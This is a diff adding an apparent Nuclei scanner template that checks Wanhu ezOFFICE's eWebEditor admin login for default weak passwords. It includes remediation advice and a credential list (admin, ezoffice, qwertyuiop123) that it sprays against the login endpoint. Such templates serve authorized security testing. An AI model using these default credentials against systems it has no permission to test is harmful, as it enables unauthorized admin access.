@@ -1,0 +1,42 @@
+id: wanhuOA-default-login
+info:
+  name: Wanhu OA eWebEditor admin backend default weak password vulnerability
+  author:
+  - 折跃
+  description: |-
+    Wanhu ezOFFICE eWebEditor admin backend default weak password vulnerability
+    Wanhu ezOFFICE collaborative office platform is an OA collaborative office software product.
+
+    The Wanhu ezOFFICE eWebEditor admin backend contains a weak password vulnerability.
+  severity: high
+  remediation: |-
+    Remedy:
+    1. It is recommended that system administrators immediately change found weak passwords to strong ones, conduct a comprehensive sweep of weak passwords across all system administrators, users and devices, and clean up any discovered weak passwords.
+    2. Weak passwords depend on management. Enterprises should formulate a strong password policy (e.g., passwords must include at least three formats among uppercase letters, lowercase letters, numbers and special characters, be no shorter than ten characters, arranged non-sequentially on the keyboard, and unrelated to corporate or personal information).
+    3. Weak passwords can be checked by aggregating all employee accounts and self-checking against strong password rules, or by brute forcing with a personalized dictionary.
+    4. Recommended strong password generator: [https://suijimimashengcheng.51240.com/](https://suijimimashengcheng.51240.com/)
+    5. Recommended password strength checker: [https://howsecureismypassword.net/](https://howsecureismypassword.net/)
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,'window.self.focus')
+  path:
+  - '{{BaseURL}}/defaultroot/public/edit/admin/login.jsp?action=login'
+  attack: clusterbomb
+  method: POST
+  body: usr={{user}}&pwd={{pass}}
+  payloads:
+    pass:
+    - admin
+    - ezoffice
+    - qwertyuiop123
+    user:
+    - admin
+    - ezoffice
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
+  stop-at-first-match: true
